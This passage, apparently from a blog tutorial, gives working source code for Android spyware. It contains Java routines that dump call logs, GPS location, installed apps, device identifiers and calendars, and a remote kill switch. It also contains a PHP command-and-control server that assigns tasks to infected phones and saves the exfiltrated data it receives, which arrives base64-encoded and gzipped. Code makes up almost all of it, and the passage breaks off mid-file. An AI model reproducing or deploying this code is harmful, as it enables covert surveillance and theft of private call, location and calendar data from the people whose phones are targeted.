        <span class="kt">int</span> <span class="n">type</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span><span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">date</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span><span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">DATE</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">duration</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span><span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">DURATION</span><span class="o">);</span>

        <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">phNumber</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">number</span><span class="o">);</span>
            <span class="nc">String</span> <span class="n">callType</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
            <span class="nc">String</span> <span class="n">callDate</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">date</span><span class="o">);</span>
            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Date</span> <span class="n">callDayTime</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Date</span><span class="o">(</span><span class="nc">Long</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">callDate</span><span class="o">));</span>
            <span class="nc">String</span> <span class="n">callDuration</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">duration</span><span class="o">);</span>
            <span class="nc">String</span> <span class="n">dir</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">dircode</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">callType</span><span class="o">);</span>
            <span class="k">switch</span> <span class="o">(</span><span class="n">dircode</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">case</span> <span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">OUTGOING_TYPE</span><span class="o">:</span>
                    <span class="n">dir</span> <span class="o">=</span> <span class="s">"OUTGOING"</span><span class="o">;</span>
                    <span class="k">break</span><span class="o">;</span>
                <span class="k">case</span> <span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">INCOMING_TYPE</span><span class="o">:</span>
                    <span class="n">dir</span> <span class="o">=</span> <span class="s">"INCOMING"</span><span class="o">;</span>
                    <span class="k">break</span><span class="o">;</span>
                <span class="k">case</span> <span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">MISSED_TYPE</span><span class="o">:</span>
                    <span class="n">dir</span> <span class="o">=</span> <span class="s">"MISSED"</span><span class="o">;</span>
                    <span class="k">break</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="n">logs</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Phone Number=&gt;"</span> <span class="o">+</span> <span class="n">phNumber</span> <span class="o">+</span> <span class="s">"\nType=&gt;"</span> <span class="o">+</span> <span class="n">dir</span> <span class="o">+</span> <span class="s">"\nDate=&gt;"</span> <span class="o">+</span> <span class="n">callDayTime</span> <span class="o">+</span> <span class="s">"\nDuration=&gt;"</span> <span class="o">+</span> <span class="n">callDuration</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">logs</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<h3 id="224-geographical-location-fetch">2.2.4. Geographical Location Fetch</h3>
<p>Physical location (latitude and longitude) with the <code class="language-plaintext highlighter-rouge">getGeoLocation</code> tag can be either found using the WiFi network, or actual last stored location from the GPS itself. If there is no cached location values, it will force update the current position:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">geoLocation</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
<span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getGeoLocation</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">ContextCompat</span><span class="o">.</span><span class="na">checkSelfPermission</span><span class="o">(</span><span class="n">getBaseContext</span><span class="o">(),</span> <span class="s">"android.permission.ACCESS_FINE_LOCATION"</span><span class="o">)</span> <span class="o">==</span> <span class="nc">PackageManager</span><span class="o">.</span><span class="na">PERMISSION_GRANTED</span> <span class="o">&amp;&amp;</span> <span class="nc">ContextCompat</span><span class="o">.</span><span class="na">checkSelfPermission</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="s">"android.permission.ACCESS_COARSE_LOCATION"</span><span class="o">)</span> <span class="o">==</span> <span class="nc">PackageManager</span><span class="o">.</span><span class="na">PERMISSION_GRANTED</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">FusedLocationProviderClient</span> <span class="n">mFusedLocationClient</span> <span class="o">=</span> <span class="nc">LocationServices</span><span class="o">.</span><span class="na">getFusedLocationProviderClient</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
        <span class="n">mFusedLocationClient</span><span class="o">.</span><span class="na">getLastLocation</span><span class="o">().</span><span class="na">addOnSuccessListener</span><span class="o">(</span><span class="k">new</span> <span class="nc">OnSuccessListener</span><span class="o">&lt;</span><span class="nc">Location</span><span class="o">&gt;()</span> <span class="o">{</span>
            <span class="nd">@Override</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onSuccess</span><span class="o">(</span><span class="nc">Location</span> <span class="n">location</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">location</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="kt">double</span> <span class="n">latitude</span> <span class="o">=</span> <span class="n">location</span><span class="o">.</span><span class="na">getLatitude</span><span class="o">();</span>
                    <span class="kt">double</span> <span class="n">longitude</span> <span class="o">=</span> <span class="n">location</span><span class="o">.</span><span class="na">getLongitude</span><span class="o">();</span>
                    <span class="n">geoLocation</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\nLatitude =&gt;"</span> <span class="o">+</span> <span class="n">latitude</span> <span class="o">+</span> <span class="s">"\n Longitude =&gt;"</span> <span class="o">+</span> <span class="n">longitude</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">geoLocation</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"N/A"</span><span class="o">);</span>

                    <span class="nc">LocationRequest</span> <span class="n">locationRequest</span> <span class="o">=</span> <span class="nc">LocationRequest</span><span class="o">.</span><span class="na">create</span><span class="o">();</span>
                    <span class="n">locationRequest</span><span class="o">.</span><span class="na">setPriority</span><span class="o">(</span><span class="nc">LocationRequest</span><span class="o">.</span><span class="na">PRIORITY_HIGH_ACCURACY</span><span class="o">);</span>
                    <span class="n">locationRequest</span><span class="o">.</span><span class="na">setInterval</span><span class="o">(</span><span class="mi">20</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">);</span>


                    <span class="k">new</span> <span class="nf">LocationCallback</span><span class="o">()</span> <span class="o">{</span>
                        <span class="nd">@Override</span>
                        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onLocationResult</span><span class="o">(</span><span class="nc">LocationResult</span> <span class="n">locationResult</span><span class="o">)</span> <span class="o">{</span>
                            <span class="k">if</span> <span class="o">(</span><span class="n">locationResult</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                                <span class="n">geoLocation</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Cannot update"</span><span class="o">);</span>
                                <span class="k">return</span><span class="o">;</span>
                            <span class="o">}</span>
                            <span class="k">for</span> <span class="o">(</span><span class="nc">Location</span> <span class="n">location</span> <span class="o">:</span> <span class="n">locationResult</span><span class="o">.</span><span class="na">getLocations</span><span class="o">())</span> <span class="o">{</span>
                                <span class="k">if</span> <span class="o">(</span><span class="n">location</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                                    <span class="kt">double</span> <span class="n">latitude</span> <span class="o">=</span> <span class="n">location</span><span class="o">.</span><span class="na">getLatitude</span><span class="o">();</span>
                                    <span class="kt">double</span> <span class="n">longitude</span> <span class="o">=</span> <span class="n">location</span><span class="o">.</span><span class="na">getLongitude</span><span class="o">();</span>
                                    <span class="n">geoLocation</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\nLatitude =&gt;"</span> <span class="o">+</span> <span class="n">latitude</span> <span class="o">+</span> <span class="s">"\n Longitude =&gt;"</span> <span class="o">+</span> <span class="n">longitude</span><span class="o">);</span>
                                <span class="o">}</span>
                            <span class="o">}</span>
                        <span class="o">}</span>
                    <span class="o">};</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">})</span>
                <span class="o">.</span><span class="na">addOnFailureListener</span><span class="o">(</span><span class="k">new</span> <span class="nc">OnFailureListener</span><span class="o">()</span> <span class="o">{</span>
                    <span class="nd">@Override</span>
                    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onFailure</span><span class="o">(</span><span class="nd">@NonNull</span> <span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                    <span class="o">}</span>
                <span class="o">});</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">geoLocation</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<h3 id="225-application-list-dump">2.2.5. Application List Dump</h3>
<p>This operation does not require any special permission and only lists user-installed apps since there are many system-installed packages that are not of interest:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchApps</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">apps</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
    <span class="nc">List</span><span class="o">&lt;</span><span class="nc">PackageInfo</span><span class="o">&gt;</span> <span class="n">packList</span> <span class="o">=</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getInstalledPackages</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">packList</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
        <span class="nc">PackageInfo</span> <span class="n">packInfo</span> <span class="o">=</span> <span class="n">packList</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">((</span><span class="n">packInfo</span><span class="o">.</span><span class="na">applicationInfo</span><span class="o">.</span><span class="na">flags</span> <span class="o">&amp;</span> <span class="nc">ApplicationInfo</span><span class="o">.</span><span class="na">FLAG_SYSTEM</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">appName</span> <span class="o">=</span> <span class="n">packInfo</span><span class="o">.</span><span class="na">applicationInfo</span><span class="o">.</span><span class="na">loadLabel</span><span class="o">(</span><span class="n">getPackageManager</span><span class="o">()).</span><span class="na">toString</span><span class="o">();</span>
            <span class="n">apps</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n ID=&gt;"</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">"\n Application=&gt;"</span> <span class="o">+</span> <span class="n">appName</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">apps</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<h3 id="226-device-information-retrieval">2.2.6. Device Information Retrieval</h3>
<p>Similarily to app list dump with respect to additional permissions, this method returns some hardware and software information on the device itself:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">deviceInfo</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Serial=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">SERIAL</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Model=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">MODEL</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n ID=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">ID</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Manufacturer=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">MANUFACTURER</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Brand=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">BRAND</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Type=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">TYPE</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n User=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">USER</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Base=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">VERSION_CODES</span><span class="o">.</span><span class="na">BASE</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Incremental=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">VERSION</span><span class="o">.</span><span class="na">INCREMENTAL</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n SDK=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">VERSION</span><span class="o">.</span><span class="na">SDK</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Board=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">BOARD</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Host=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">HOST</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Fingerprint=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">FINGERPRINT</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Release=&gt;"</span> <span class="o">+</span> <span class="nc">Build</span><span class="o">.</span><span class="na">VERSION</span><span class="o">.</span><span class="na">RELEASE</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">info</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<h3 id="227-calendar-entries-dump">2.2.7. Calendar Entries Dump</h3>
<p>This capability requires the <code class="language-plaintext highlighter-rouge">READ_CALENDAR</code> permission and returns a list of calendars available on the phone:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchCalendar</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">calendar</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">ContextCompat</span><span class="o">.</span><span class="na">checkSelfPermission</span><span class="o">(</span><span class="n">getBaseContext</span><span class="o">(),</span> <span class="s">"android.permission.READ_CALENDAR"</span><span class="o">)</span> <span class="o">==</span> <span class="nc">PackageManager</span><span class="o">.</span><span class="na">PERMISSION_GRANTED</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">final</span> <span class="nc">Uri</span> <span class="no">CALENDAR_URI</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.android.calendar/calendars"</span><span class="o">);</span>
        <span class="nc">ContentResolver</span> <span class="n">contentResolver</span> <span class="o">=</span> <span class="n">getBaseContext</span><span class="o">().</span><span class="na">getContentResolver</span><span class="o">();</span>
        <span class="kd">final</span> <span class="nc">String</span><span class="o">[]</span> <span class="no">FIELDS</span> <span class="o">=</span> <span class="o">{</span>
                <span class="nc">CalendarContract</span><span class="o">.</span><span class="na">Calendars</span><span class="o">.</span><span class="na">NAME</span><span class="o">,</span>
                <span class="nc">CalendarContract</span><span class="o">.</span><span class="na">Calendars</span><span class="o">.</span><span class="na">CALENDAR_DISPLAY_NAME</span><span class="o">,</span>
                <span class="nc">CalendarContract</span><span class="o">.</span><span class="na">Calendars</span><span class="o">.</span><span class="na">CALENDAR_COLOR</span><span class="o">,</span>
                <span class="nc">CalendarContract</span><span class="o">.</span><span class="na">Calendars</span><span class="o">.</span><span class="na">VISIBLE</span>
        <span class="o">};</span>

        <span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">contentResolver</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="no">CALENDAR_URI</span><span class="o">,</span> <span class="no">FIELDS</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getCount</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
                    <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
                    <span class="nc">String</span> <span class="n">displayName</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
                    <span class="nc">String</span> <span class="n">color</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span><span class="nc">CalendarContract</span><span class="o">.</span><span class="na">Calendars</span><span class="o">.</span><span class="na">CALENDAR_COLOR</span><span class="o">));</span>
                    <span class="n">calendar</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n Name=&gt;"</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">"\n Display Name=&gt;"</span> <span class="o">+</span> <span class="n">displayName</span> <span class="o">+</span> <span class="s">"\n Color=&gt;"</span> <span class="o">+</span> <span class="n">color</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">AssertionError</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">calendar</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<h3 id="228-service-termination">2.2.8. Service Termination</h3>
<p>In case you want to remotely terminate the background service, you may use <code class="language-plaintext highlighter-rouge">kill</code> keyword as a kill switch:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">AlarmManager</span> <span class="n">alarmManager</span> <span class="o">=</span> <span class="o">(</span><span class="nc">AlarmManager</span><span class="o">)</span> <span class="n">getSystemService</span><span class="o">(</span><span class="nc">Context</span><span class="o">.</span><span class="na">ALARM_SERVICE</span><span class="o">);</span>
<span class="nc">Intent</span> <span class="n">invokeService</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="nc">Fetcher</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="nc">PendingIntent</span> <span class="n">pintent</span> <span class="o">=</span> <span class="nc">PendingIntent</span><span class="o">.</span><span class="na">getService</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="mi">0</span><span class="o">,</span> <span class="n">invokeService</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
<span class="k">if</span> <span class="o">(</span><span class="n">alarmManager</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">alarmManager</span><span class="o">.</span><span class="na">cancel</span><span class="o">(</span><span class="n">pintent</span><span class="o">);</span>
    <span class="n">stopSelf</span><span class="o">();</span>
<span class="o">}</span></code></pre></figure>

<h2 id="23-implementation">2.3. Implementation</h2>
<p>The backend Apache2 server hosts a PHP script which handles queries and processes data. For the sake of simplicity, the following script does not include any MySQL database, instead, we will save exfiltrated data in a simple text file:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"GET"</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]))</span> <span class="p">{</span>
		<span class="nv">$id</span> <span class="o">=</span> <span class="nf">sanitize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[0-9a-f]</span><span class="si">{</span><span class="nv">8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12</span><span class="si">}</span><span class="s2">/i"</span><span class="p">,</span> <span class="nv">$id</span><span class="p">))</span> <span class="p">{</span>
			<span class="c1">// Available: kill, smsDump, contactsDump, callsDump, getGeoLocation, appsDump, deviceInfo, calendarsDump</span>
			<span class="nv">$json</span> <span class="o">=</span> <span class="p">[</span> <span class="s1">'uuid'</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">,</span> <span class="s1">'task'</span> <span class="o">=&gt;</span> <span class="s1">'smsDump'</span> <span class="p">];</span>
			<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-type:application/json;charset=utf-8'</span><span class="p">);</span>
			<span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$json</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="k">echo</span> <span class="s2">"Incorrect UUID format"</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="k">echo</span> <span class="s2">"UUID not set"</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'task'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'uuid'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]))</span> <span class="p">{</span>
		<span class="k">die</span><span class="p">(</span><span class="s2">"Incorrect POST parameters"</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="nv">$id</span> <span class="o">=</span> <span class="nf">sanitize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'uuid'</span><span class="p">]);</span>
	<span class="nv">$task</span> <span class="o">=</span> <span class="nf">sanitize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'task'</span><span class="p">]);</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">];</span>

	<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$task</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">die</span><span class="p">(</span><span class="s2">"Parameters cannot be empty"</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">rawurldecode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">gzdecode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>

	<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'output.txt'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">sanitize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
	<span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure>

<p>To minimize manual code modifications in Android Studio, I have put the declaration of the C&amp;C server at the <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code> file:</p>

<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;resources&gt;</span>
